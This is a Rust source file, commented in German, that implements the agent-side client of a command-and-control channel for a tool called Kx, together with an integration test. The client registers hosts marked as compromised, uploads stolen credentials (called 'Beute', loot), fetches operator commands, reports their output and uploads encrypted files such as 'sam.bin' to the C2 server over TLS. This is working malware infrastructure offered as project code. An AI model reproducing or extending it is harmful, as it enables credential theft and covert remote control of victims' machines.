//! C2-Kommunikation: Client für den Kx-Server.
//!
//! Der Transport des Protokolls liegt in `kx_core::c2::transport` — dort
//! stehen TLS-Aufbau, Bearer-Header, URL-Bildung und die Abbildung eines
//! HTTP-Status auf einen Fehler. Dieses Modul ist ein dünner Adapter: es
//! bindet die Pfade und die Typen des Protokolls an den Transport.
//!
//! Die Nachrichten selbst sind nicht hier definiert, sondern in
//! `kx_core::c2` — der Agent und der Server sprechen denselben Vertrag.
//!
//! Der Transport ist blockierend: `ureq` wartet auf die Antwort, während der
//! Agent in seiner `async fn` steht. Die Methoden sind deshalb bewusst
//! synchron — ein `async fn` um einen blockierenden Aufruf herum täuscht
//! Parallelität vor, die es nicht gibt.

use kx_core::c2::transport::{Transport, TransportError};
use kx_core::c2::{
    RegisterRequest, SecretUpload, Task, TaskResultRequest, PATH_REGISTER, PATH_SECRETS,
    PATH_TASKS, PATH_TASKS_RESULT,
};

/// Der Seam, an dem der Agent den C2-Server erreicht.
///
/// Zwei Adapter stehen dahinter: die [`C2Client`] im Betrieb und ein
/// Aufzeichner im Test. Der Seam ist die Stelle, an der die Meldelogik —
/// Reihenfolge, Zählung, Verweigerung — ohne laufenden Server prüfbar wird.
///
/// Der Port trägt genau die vier Aufrufe, die der Agent an den C2 richtet:
/// einen Host anmelden, Beute melden, Tasks holen und ein Task-Ergebnis
/// melden. Alles andere — TLS, Header, Statusabbildung — liegt im Transport
/// und bleibt dort.
pub trait C2Port {
    /// Registriert einen Host beim C2-Server.
    ///
    /// Der Host muss dem Server bekannt sein, bevor seine Beute bei ihm
    /// eingeht: eine Beutezeile ohne bekannten Host kann der Operator keinem
    /// Zielhost zuordnen.
    fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError>;

    /// Meldet ein Stück Beute beim C2-Server.
    fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError>;

    /// Holt die offenen Tasks unter `/api/tasks`.
    fn hole_tasks(&self) -> Result<Vec<Task>, TransportError>;

    /// Meldet das Ergebnis eines ausgeführten Tasks unter `/api/tasks/result`.
    fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError>;

    /// Meldet einen KXENC-Datei-Container unter `/api/files` (Issue #31).
    fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError>;
}

/// C2-Client — ein Adapter über den Transport aus `kx_core::c2::transport`.
pub struct C2Client {
    transport: Transport,
}

impl C2Client {
    /// Erzeugt einen Client für den angegebenen Server.
    ///
    /// `server_cert`: PEM-Pfad zum Server-Zertifikat (vertraut gemacht).
    pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, TransportError> {
        Ok(Self {
            transport: Transport::from_cert_file(server, token, server_cert)?,
        })
    }
}

impl C2Port for C2Client {
    fn registriere_host(&self, req: &RegisterRequest) -> Result<(), TransportError> {
        self.transport.post_json(PATH_REGISTER, req)
    }

    fn melde_beute(&self, upload: &SecretUpload) -> Result<(), TransportError> {
        self.transport.post_json(PATH_SECRETS, upload)
    }

    fn hole_tasks(&self) -> Result<Vec<Task>, TransportError> {
        self.transport.get_json(PATH_TASKS)
    }

    fn melde_task_ergebnis(&self, report: &TaskResultRequest) -> Result<(), TransportError> {
        self.transport.post_json(PATH_TASKS_RESULT, report)
    }

    fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError> {
        self.transport.post_json(kx_core::c2::PATH_FILES, upload)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Der Vertrag pinnt die Pfade — `kx_core::c2::endpoint_paths_are_stable`.
    ///
    /// Hier noch einmal die eigenen Literale zu wiederholen war eine Abschrift:
    /// sie konnte nur scheitern, wenn jemand Konstante *und* Literal im
    /// selben Commit änderte.
    #[test]
    fn die_pfade_stammen_aus_dem_vertrag() {
        assert!(PATH_REGISTER.starts_with('/'));
        assert!(PATH_SECRETS.starts_with('/'));
        assert!(PATH_TASKS.starts_with('/'));
        assert!(PATH_TASKS_RESULT.starts_with('/'));
    }

    /// Alle fuenf Aufrufe des Adapters laufen ueber **echtes TLS** gegen den
    /// echten Server: Registrierung, Beute-Upload, Task-Abholung,
    /// Task-Ergebnis und Datei-Upload (Issues #69, #31). Gegen den Router
    /// allein waere der Transport — TLS-Aufbau, Bearer-Header,
    /// Statusabbildung — ungetestet.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn der_client_spricht_alle_aufrufe_ueber_echtes_tls() {
        use kx_core::c2::{CreateTaskRequest, TaskResultRequest, STATUS_DONE};

        let tls = kx_tls::generate_server_tls("127.0.0.1").expect("TLS-Material");
        let dir = std::env::temp_dir().join(format!("kx-c2client-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).expect("Testverzeichnis");
        let cert_pfad = dir.join("server.crt");
        std::fs::write(&cert_pfad, &tls.cert_pem).expect("Zertifikat");

        let db =
            std::sync::Arc::new(kx_server::db::Db::open(&dir.join("kx.db")).expect("Datenbank"));
        // ADR-0004: der Host muss vor seinem Task existieren.
        db.upsert_host(&RegisterRequest {
            host_id: "10.0.0.5".into(),
            ip: "10.0.0.5".into(),
            hostname: None,
            os: None,
            status: None,
            sealed_master: None,
            master_key: None,
        })
        .expect("Host");
        let task = db
            .insert_task(&CreateTaskRequest {
                host_id: "10.0.0.5".into(),
                command: "whoami".into(),
            })
            .expect("Task");
        let router = kx_server::app(kx_server::AppState {
            db: db.clone(),
            token: std::sync::Arc::new("kx-clienttest".to_string()),
        });
        let config = axum_server::tls_rustls::RustlsConfig::from_pem(
            tls.cert_pem.clone(),
            tls.key_pem.clone(),
        )
        .await
        .expect("rustls-Config");
        let handle = axum_server::Handle::new();
        let server_handle = handle.clone();
        let server = tokio::spawn(async move {
            axum_server::bind_rustls("127.0.0.1:0".parse().expect("Adresse"), config)
                .handle(server_handle)
                .serve(router.into_make_service())
                .await
                .expect("Server");
        });
        let addr = handle.listening().await.expect("lauschende Adresse");
        let url = format!("https://{addr}");
        let cert = cert_pfad.to_string_lossy().to_string();
        let task_id = task.id.clone();

        // Der Transport blockiert (ureq) — er gehoert nicht auf einen
        // Worker-Thread des Runtimes, auf dem auch der Server laeuft.
        let task_id_report = task_id.clone();
        let task_id_abholung = task_id.clone();
        tokio::task::spawn_blocking(move || {
            let client = C2Client::new(&url, "kx-clienttest", &cert).expect("Client");

            client
                .registriere_host(&RegisterRequest {
                    host_id: "10.0.0.5".into(),
                    ip: "10.0.0.5".into(),
                    hostname: Some("ziel".into()),
                    os: Some("Linux".into()),
                    status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
                    sealed_master: None,
                    master_key: None,
                })
                .expect("Registrierung");

            client
                .melde_beute(
                    &SecretUpload {
                        host_id: "10.0.0.5".into(),
                        cred_type: "password".into(),
                        username: "root".into(),
                        password: String::new(),
                        source: Some("test".into()),
                        master_key: None,
                        sealed_password: None,
                        sealed_master: None,
                    }
                    .mit_passwort("geheim"),
                )
                .expect("Beute-Upload");

            let tasks = client.hole_tasks().expect("Task-Abholung");
            assert!(
                tasks.iter().any(|t| t.id == task_id_abholung),
                "der angelegte Task fehlt in der Abholung"
            );

            client
                .melde_task_ergebnis(&TaskResultRequest {
                    task_id: task_id_report,
                    status: STATUS_DONE.into(),
                    result: "root".into(),
                })
                .expect("Task-Ergebnis");

            client
                .melde_datei(&kx_core::c2::FileUpload {
                    host_id: "10.0.0.5".into(),
                    file_id: "000102030405060708090a0b0c0d0e0f".into(),
                    filename: "sam.bin".into(),
                    plain_size: 128,
                    container: "a3hlbmM=".into(),
                    sealed_master: String::new(),
                })
                .expect("Datei-Upload");
        })
        .await
        .expect("Client-Aufrufe");

        // Die Wirkung zaehlt: der Server hat alles persistiert.
        let hosts = db.list_hosts().expect("Hosts");
        assert!(hosts.iter().any(|h| h.host_id == "10.0.0.5"));
        let secrets = db.list_secrets().expect("Secrets");
        assert_eq!(secrets.len(), 1, "die Beute fehlt in der Ablage");
        let tasks = db.list_tasks().expect("Tasks");
        let gemeldet = tasks
            .iter()
            .find(|t| t.id == task_id)
            .expect("Task in der Ablage");
        assert_eq!(gemeldet.status, STATUS_DONE);
        assert_eq!(gemeldet.result, "root");
        let files = db.list_files().expect("Dateien");
        assert_eq!(files.len(), 1, "der Container fehlt in der Ablage");
        assert_eq!(files[0].filename, "sam.bin");

        handle.shutdown();
        let _ = server.await;
        std::fs::remove_dir_all(&dir).ok();
    }
}
